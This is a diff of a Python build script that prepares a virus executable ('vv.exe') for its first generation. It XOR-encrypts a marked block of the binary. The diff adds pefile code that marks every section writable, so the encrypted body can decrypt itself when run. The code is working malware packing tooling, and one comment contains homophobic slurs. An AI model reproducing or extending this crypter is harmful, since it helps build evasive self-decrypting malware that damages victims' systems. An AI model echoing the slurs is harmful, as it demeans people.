@@ -1,6 +1,9 @@
 #VV Generation#0 preparation script
 #Usage format: python prepare_generation0.py [ file_path [cryptKey]]
 #Example: python initial_encrypt.py C:\vv.exe DEADBEEF
+#Depends: pefile. Install via "pip install pefile"
+
+import os
 
 #Feel free to modify values for your setup
 filePath="vv.exe"
@@ -31,7 +34,6 @@ def process(par_targetFilePath, par_cryptKey,par_markerValue):
     import pefile
     #1.Encrypt main body
     #Read file contents
-    #(Virus binary not so big => its OK to read it all)
     hFile=open(par_targetFilePath,"r+b")
     fileContents=mmap.mmap(hFile.fileno(),0)
     #Search block to encrypt
@@ -40,12 +42,26 @@ def process(par_targetFilePath, par_cryptKey,par_markerValue):
     #Encrypt with key
     for i in range(cryptBlockSize):
         fileContents[offset_cryptBlockBegin+i]^=par_cryptKey[i%len(par_cryptKey)]
-    
+
     #2.Adjust section characteristics
-    #TODO
+    pe=pefile.PE(par_targetFilePath)
+
+    #Search last section in file
+
+    #Add IMAGE_SCN_MEM_WRITE to all sections
+    for i in range(len(pe.sections)):
+        pe.sections[i].Characteristics |= pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE']
+
+    #Niice mmapped file saving, faggots morons
+    #Raw string ;3 really idiots
+    resultFileContents=pe.write()
+
+    for i in range(fileContents.size()):
+        fileContents[i]=resultFileContents[i]
 
     fileContents.close()
     hFile.close()
+
 
 #====================================================================================================
 def main():
@@ -54,7 +70,6 @@ def main():
     global markerValue
 
     import sys
-    import os
 
     if(len(sys.argv)>4):
         print("[ERROR] Invalid format.\n")
